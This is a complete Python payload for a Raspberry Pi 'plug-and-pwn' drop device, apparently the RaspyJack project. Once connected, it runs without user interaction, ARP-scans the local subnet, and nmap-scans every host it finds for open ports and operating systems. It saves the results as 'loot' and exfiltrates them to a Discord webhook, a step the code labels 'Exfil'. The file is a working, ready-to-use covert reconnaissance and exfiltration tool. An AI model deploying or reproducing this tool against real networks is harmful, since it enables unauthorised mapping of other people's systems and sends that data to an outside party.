#!/usr/bin/env python3
"""
RaspyJack Payload -- Automated Reconnaissance (Shark Jack Style)
================================================================
Author: 7h30th3r0n3

Plug-and-pwn: runs AUTOMATICALLY on launch with zero user interaction.

Setup / Prerequisites:
  - Optional: Discord webhook in /root/Raspyjack/discord_webhook.txt
    for auto-exfil of results.

Sequence:
  1. Detect active network interface (eth0 preferred, fallback wlan0)
  2. ARP scan local subnet via scapy
  3. Quick nmap scan (-T4 --top-ports 100) on all discovered hosts
  4. Collect results: IPs, MACs, open ports, OS hints
  5. Save JSON loot to /root/Raspyjack/loot/AutoRecon/
  6. POST results to Discord webhook if configured
  7. LCD shows live progress throughout
  8. Auto-exits on completion (KEY3 to abort early)

Controls:
  KEY3 -- Abort and exit
"""

import os
import sys
import time
import json
import subprocess
import threading
import base64
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/AutoRecon"
WEBHOOK_PATH = "/root/Raspyjack/discord_webhook.txt"
INTERFACES_PREFERRED = ["eth0", "eth1", "usb0", "wlan0", "wlan1"]
NMAP_TOP_PORTS = 100
NMAP_TIMING = "-T4"

os.makedirs(LOOT_DIR, exist_ok=True)

# ---------------------------------------------------------------------------
# Thread-safe shared state (immutable updates via lock)
# ---------------------------------------------------------------------------
_lock = threading.Lock()
_state = {
    "phase": "Init",
    "status_line1": "AutoRecon",
    "status_line2": "Starting...",
    "host_count": 0,
    "progress_pct": 0,
    "abort": False,
    "done": False,
}


def _get_state():
    """Return a snapshot of current state."""
    with _lock:
        return dict(_state)


def _set_state(**kwargs):
    """Update state fields immutably."""
    with _lock:
        for k, v in kwargs.items():
            _state[k] = v


def _is_aborted():
    with _lock:
        return _state["abort"]


# ---------------------------------------------------------------------------
# LCD drawing
# ---------------------------------------------------------------------------
def _draw_lcd():
    """Render current state on LCD."""
    st = _get_state()
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "AUTO RECON", font=font, fill="#FF4444")
    phase_color = "#00FF00" if st["done"] else "#FFAA00"
    d.text((80, 1), st["phase"][:7], font=font, fill=phase_color)

    # Status lines
    d.text((4, 20), st["status_line1"][:21], font=font, fill="white")
    d.text((4, 34), st["status_line2"][:21], font=font, fill="#AAAAAA")

    # Host count
    d.text((4, 52), f"Hosts: {st['host_count']}", font=font, fill="#00CCFF")

    # Progress bar
    bar_y = 70
    d.rectangle((4, bar_y, 123, bar_y + 10), outline="#444")
    bar_w = int(119 * st["progress_pct"] / 100)
    if bar_w > 0:
        d.rectangle((4, bar_y, 4 + bar_w, bar_y + 10), fill="#00AA44")
    pct_text = f"{st['progress_pct']}%"
    d.text((55, bar_y + 1), pct_text, font=font, fill="white")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "KEY3: Abort", font=font, fill="#AA5555")

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Network detection
# ---------------------------------------------------------------------------
def _detect_interface():
    """Find the first active network interface with an IP address."""
    for iface in INTERFACES_PREFERRED:
        try:
            result = subprocess.run(
                ["ip", "-4", "addr", "show", iface],
                capture_output=True, text=True, timeout=5,
            )
            if "inet " in result.stdout:
                return iface
        except Exception:
            continue
    return None


def _get_interface_info(iface):
    """Return (ip, subnet_cidr) for the given interface."""
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", iface],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                parts = line.split()
                cidr = parts[1]  # e.g. "192.168.1.10/24"
                ip_addr = cidr.split("/")[0]
                return ip_addr, cidr
    except Exception:
        pass
    return None, None


def _get_subnet(cidr):
    """Derive subnet from CIDR notation (e.g. 192.168.1.0/24)."""
    if not cidr or "/" not in cidr:
        return None
    parts = cidr.split("/")
    ip_parts = parts[0].split(".")
    mask_bits = int(parts[1])
    if mask_bits >= 24:
        return f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
    elif mask_bits >= 16:
        return f"{ip_parts[0]}.{ip_parts[1]}.0.0/16"
    return cidr


# ---------------------------------------------------------------------------
# ARP scan via scapy (subprocess fallback: arp-scan)
# ---------------------------------------------------------------------------
def _arp_scan_scapy(subnet):
    """
    ARP scan using scapy as a subprocess to avoid import issues.
    Returns list of dicts: [{ip, mac}, ...]
    """
    script = (
        f"from scapy.all import ARP, Ether, srp\n"
        f"ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='{subnet}'), "
        f"timeout=10, verbose=0)\n"
        f"import json\n"
        f"results = []\n"
        f"for s, r in ans:\n"
        f"    results.append({{'ip': r.psrc, 'mac': r.hwsrc}})\n"
        f"print(json.dumps(results))\n"
    )
    try:
        result = subprocess.run(
            ["python3", "-c", script],
            capture_output=True, text=True, timeout=60,
        )
        if result.returncode == 0 and result.stdout.strip():
            return json.loads(result.stdout.strip())
    except Exception:
        pass
    return []


def _arp_scan_fallback(subnet):
    """Fallback ARP scan using arp-scan CLI tool."""
    try:
        result = subprocess.run(
            ["arp-scan", "--localnet", "-q"],
            capture_output=True, text=True, timeout=30,
        )
        hosts = []
        for line in result.stdout.splitlines():
            parts = line.split("\t")
            if len(parts) >= 2:
                ip_str = parts[0].strip()
                mac_str = parts[1].strip()
                if "." in ip_str and ":" in mac_str:
                    hosts.append({"ip": ip_str, "mac": mac_str})
        return hosts
    except Exception:
        return []


def _arp_scan(subnet):
    """Run ARP scan, trying scapy first then arp-scan."""
    hosts = _arp_scan_scapy(subnet)
    if not hosts:
        hosts = _arp_scan_fallback(subnet)
    return hosts


# ---------------------------------------------------------------------------
# Nmap scanning
# ---------------------------------------------------------------------------
def _nmap_scan(hosts):
    """
    Run nmap on discovered hosts. Returns enriched host list with
    open ports and OS hints.
    """
    if not hosts:
        return []

    ip_list = [h["ip"] for h in hosts]
    ip_str = " ".join(ip_list)

    try:
        result = subprocess.run(
            [
                "nmap", NMAP_TIMING,
                "--top-ports", str(NMAP_TOP_PORTS),
                "-O", "--osscan-guess",
                "-oX", "-",
                *ip_list,
            ],
            capture_output=True, text=True, timeout=300,
        )
        return _parse_nmap_xml(result.stdout, hosts)
    except FileNotFoundError:
        _set_state(status_line2="nmap not found!")
        return _enrich_without_nmap(hosts)
    except subprocess.TimeoutExpired:
        _set_state(status_line2="nmap timed out")
        return _enrich_without_nmap(hosts)
    except Exception:
        return _enrich_without_nmap(hosts)


def _parse_nmap_xml(xml_output, hosts):
    """Parse nmap XML output and enrich host data."""
    import xml.etree.ElementTree as ET

    ip_to_host = {h["ip"]: dict(h) for h in hosts}

    try:
        root = ET.fromstring(xml_output)
    except ET.ParseError:
        return _enrich_without_nmap(hosts)

    for host_elem in root.findall(".//host"):
        addr_elem = host_elem.find("address[@addrtype='ipv4']")
        if addr_elem is None:
            continue
        ip = addr_elem.get("addr", "")
        if ip not in ip_to_host:
            ip_to_host[ip] = {"ip": ip, "mac": ""}

        # Open ports
        open_ports = []
        for port_elem in host_elem.findall(".//port"):
            state_elem = port_elem.find("state")
            if state_elem is not None and state_elem.get("state") == "open":
                port_id = port_elem.get("portid", "")
                protocol = port_elem.get("protocol", "tcp")
                service_elem = port_elem.find("service")
                service_name = ""
                if service_elem is not None:
                    service_name = service_elem.get("name", "")
                open_ports.append({
                    "port": int(port_id) if port_id.isdigit() else port_id,
                    "protocol": protocol,
                    "service": service_name,
                })

        # OS detection
        os_hint = ""
        os_match = host_elem.find(".//osmatch")
        if os_match is not None:
            os_hint = os_match.get("name", "")

        # MAC from nmap (may override ARP result)
        mac_elem = host_elem.find("address[@addrtype='mac']")
        mac_addr = ip_to_host[ip].get("mac", "")
        vendor = ""
        if mac_elem is not None:
            mac_addr = mac_elem.get("addr", mac_addr)
            vendor = mac_elem.get("vendor", "")

        ip_to_host[ip] = {
            **ip_to_host[ip],
            "mac": mac_addr,
            "vendor": vendor,
            "open_ports": open_ports,
            "os_hint": os_hint,
        }

    return list(ip_to_host.values())


def _enrich_without_nmap(hosts):
    """Add empty port/OS fields when nmap is unavailable."""
    return [
        {**h, "open_ports": [], "os_hint": "", "vendor": ""}
        for h in hosts
    ]


# ---------------------------------------------------------------------------
# Loot saving
# ---------------------------------------------------------------------------
def _save_loot(results, iface, subnet, scan_duration):
    """Save scan results as JSON to loot directory."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    loot_data = {
        "scan_timestamp": datetime.now().isoformat(),
        "interface": iface,
        "subnet": subnet,
        "duration_seconds": round(scan_duration, 1),
        "total_hosts": len(results),
        "hosts": results,
    }

    filename = f"recon_{timestamp}.json"
    filepath = os.path.join(LOOT_DIR, filename)

    with open(filepath, "w") as f:
        json.dump(loot_data, f, indent=2)

    return filepath, loot_data


# ---------------------------------------------------------------------------
# Discord exfiltration
# ---------------------------------------------------------------------------
def _read_webhook_url():
    """Read Discord webhook URL from config file."""
    try:
        with open(WEBHOOK_PATH, "r") as f:
            url = f.read().strip()
        if url and url.startswith("https://"):
            return url
    except (FileNotFoundError, PermissionError):
        pass
    return None


def _post_to_discord(webhook_url, loot_data):
    """POST scan results to Discord webhook."""
    try:
        import requests
    except ImportError:
        _set_state(status_line2="requests not installed")
        return False

    summary_lines = [
        f"**AutoRecon Results** - {loot_data['scan_timestamp']}",
        f"Interface: `{loot_data['interface']}` | Subnet: `{loot_data['subnet']}`",
        f"Duration: {loot_data['duration_seconds']}s | Hosts: {loot_data['total_hosts']}",
        "",
    ]

    for host in loot_data["hosts"][:20]:
        ports_str = ", ".join(
            f"{p['port']}/{p['service']}" for p in host.get("open_ports", [])[:5]
        )
        os_str = host.get("os_hint", "")[:30]
        line = f"`{host['ip']}` ({host.get('mac', '?')[:17]})"
        if ports_str:
            line += f" ports:[{ports_str}]"
        if os_str:
            line += f" os:{os_str}"
        summary_lines.append(line)

    if loot_data["total_hosts"] > 20:
        summary_lines.append(f"... and {loot_data['total_hosts'] - 20} more")

    message = "\n".join(summary_lines)

    # Discord message limit is 2000 chars
    if len(message) > 1990:
        message = message[:1990] + "..."

    payload = {"content": message}

    try:
        resp = requests.post(webhook_url, json=payload, timeout=30)
        if resp.status_code in (200, 204):
            return True
        _set_state(status_line2=f"Discord: {resp.status_code}")
        return False
    except Exception as exc:
        _set_state(status_line2=f"Discord err: {str(exc)[:15]}")
        return False


def _post_loot_file_to_discord(webhook_url, filepath):
    """Upload the JSON loot file as an attachment to Discord."""
    try:
        import requests
    except ImportError:
        return False

    filename = os.path.basename(filepath)
    try:
        with open(filepath, "rb") as f:
            files = {"file": (filename, f, "application/json")}
            payload = {"content": f"AutoRecon loot: {filename}"}
            resp = requests.post(
                webhook_url, data=payload, files=files, timeout=60,
            )
            return resp.status_code in (200, 204)
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Main recon sequence (runs in background thread)
# ---------------------------------------------------------------------------
def _recon_sequence():
    """Execute the full recon pipeline."""
    start_time = time.time()

    # Phase 1: Detect interface
    _set_state(
        phase="Detect",
        status_line1="Detecting iface...",
        status_line2="Checking eth0/wlan0",
        progress_pct=5,
    )

    iface = _detect_interface()
    if _is_aborted():
        return

    if iface is None:
        _set_state(
            status_line1="No interface found!",
            status_line2="Check network cable",
            phase="Error",
            done=True,
        )
        return

    my_ip, cidr = _get_interface_info(iface)
    subnet = _get_subnet(cidr)

    if not subnet:
        _set_state(
            status_line1=f"No IP on {iface}",
            status_line2="DHCP not ready?",
            phase="Error",
            done=True,
        )
        return

    _set_state(
        status_line1=f"iface: {iface}",
        status_line2=f"IP: {my_ip}",
        progress_pct=10,
    )
    time.sleep(0.5)

    if _is_aborted():
        return

    # Phase 2: ARP scan
    _set_state(
        phase="ARP",
        status_line1="Scanning...",
        status_line2=f"ARP scan {subnet}",
        progress_pct=15,
    )

    arp_hosts = _arp_scan(subnet)
    if _is_aborted():
        return

    _set_state(
        host_count=len(arp_hosts),
        status_line1=f"Found {len(arp_hosts)} hosts",
        status_line2="Starting nmap...",
        progress_pct=35,
    )
    time.sleep(0.3)

    # Phase 3: Nmap scan
    if _is_aborted():
        return

    _set_state(
        phase="Nmap",
        status_line1="Nmap scanning...",
        status_line2=f"{len(arp_hosts)} targets",
        progress_pct=40,
    )

    enriched_hosts = _nmap_scan(arp_hosts)
    if _is_aborted():
        return

    _set_state(
        host_count=len(enriched_hosts),
        status_line1=f"Scanned {len(enriched_hosts)} hosts",
        progress_pct=75,
    )

    # Phase 4: Save loot
    _set_state(
        phase="Loot",
        status_line2="Saving results...",
        progress_pct=80,
    )

    scan_duration = time.time() - start_time
    filepath, loot_data = _save_loot(enriched_hosts, iface, subnet, scan_duration)

    if _is_aborted():
        return

    _set_state(
        status_line1=f"Saved: {os.path.basename(filepath)[:18]}",
        progress_pct=85,
    )

    # Phase 5: Discord exfiltration
    webhook_url = _read_webhook_url()
    if webhook_url and not _is_aborted():
        _set_state(
            phase="Exfil",
            status_line1="Exfiltrating...",
            status_line2="Sending to Discord",
            progress_pct=90,
        )

        success_msg = _post_to_discord(webhook_url, loot_data)
        _post_loot_file_to_discord(webhook_url, filepath)

        if success_msg:
            _set_state(status_line2="Discord: sent!")
        else:
            _set_state(status_line2="Discord: failed")
    else:
        _set_state(
            status_line2="No webhook config",
            progress_pct=95,
        )

    # Done
    elapsed = round(time.time() - start_time, 1)
    _set_state(
        phase="Done",
        status_line1=f"Complete! {elapsed}s",
        status_line2=f"{len(enriched_hosts)} hosts found",
        progress_pct=100,
        done=True,
    )


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    """Entry point: start recon thread, poll KEY3 for abort."""

    recon_thread = threading.Thread(target=_recon_sequence, daemon=True)
    recon_thread.start()

    try:
        while True:
            _draw_lcd()

            btn = get_button(PINS, GPIO)
            if btn == "KEY3":
                _set_state(
                    abort=True,
                    phase="Abort",
                    status_line1="Aborting...",
                    status_line2="Cleaning up",
                )
                _draw_lcd()
                break

            st = _get_state()
            if st["done"]:
                # Show final screen for a few seconds then exit
                _draw_lcd()
                time.sleep(5)
                break

            time.sleep(0.1)

    finally:
        _set_state(abort=True)
        recon_thread.join(timeout=5)
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
